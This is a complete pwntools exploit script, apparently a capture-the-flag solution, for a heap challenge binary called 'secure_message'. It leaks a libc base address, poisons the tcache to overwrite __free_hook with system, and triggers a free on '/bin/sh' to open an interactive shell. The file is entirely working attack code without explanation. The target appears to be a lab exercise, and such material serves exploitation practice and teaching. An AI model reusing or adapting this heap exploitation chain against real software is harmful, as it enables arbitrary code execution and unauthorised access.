from pwn import *

elf = ELF('./secure_message')
p = process(elf.path)
print proc.pidof(p)[0]

def register(name, passwd, desc):
    p.sendlineafter('Choice: ', '1')
    p.sendafter('Username:', name)
    p.sendafter('Password:', passwd)
    p.sendafter('Describe your self', desc)

def login(name, passwd):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('Username:', name)
    p.sendlineafter('Password:', passwd)

def add(name, size, content):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('Name: ', name)
    p.sendlineafter('Size:', str(size))
    p.send(content)

def edit(num, size, content):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('edit?', str(num))
    p.sendlineafter('Size:', str(size))
    p.send(content)

def remove(num):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('?', str(num))

#overwrite the fd
register('a\n', 'a\n','a\n')
register('b\n','b\n','b\n')
register('c\n','c\n','c\n')
register('d\n','d'*0x20,'d\n')
login('a', 'a')

#leak address
add('', 0x1000, '\n')
p.send(p64(0xdeaddead000))
p.send(p64(0xdeaddead000))
p.send(p64(0))

add('', 0x100, '\n')
p.send(p64(0xdeaddeae000))
p.send(p64(0xdeaddeae000))
p.send((p64(0)+p64(0x1111111111111111))*2)

p.sendlineafter('Choice: ', '4')
p.recvuntil(']\n')
p.recvuntil(']\n')

buf1 = p.recvuntil('00')
buf2 = p.recvuntil('1111')
if len(buf1)==14:
    libc_base = u64(buf1.decode('hex')+'\x00') - 0x3ec2b0
elif len(buf2)==16:
    libc_base = (u64(buf2.decode('hex'))^0x1111111111111111) - 0x3ec2b0
else:
    exit()
    
#make fake tcache 
edit(0, -1, 'a\n')
payload = 'd'*0xfd0 + p32(0x100) + p32(1) + p64(0xdeaddeaf040)
add('c', 0x1100, payload+'\n')
p.send(p64(0xdeaddead000))
p.send(p64(0xdeaddead000))
p.send(p64(0)*4)
payload = p64(0)+p64(0x31)+p64(0) * 5+p64(0x31)
edit(5, 0x100, payload+'\n')
remove(0)

free_hook = libc_base + 0x3ed8e8
payload = p64(0) + p64(0x31)+p64(free_hook)+p64(0) * 4+p64(0x31)
edit(5, 0x100, payload+'\n')

add('a', 0xf00, 'a\n')
p.send(p64(0xbeefdead000))
p.send(p64(0xbeefdead000))
p.send(p64(0)*4)

#overwrite free_hook
system = libc_base+0x4f440
add('a', 0xf00, '/bin/sh\x00\n')
p.send(p64(0xbeefdead000))
p.send(p64(0xbeefdead000))
p.send(p64(system))

p.interactive()

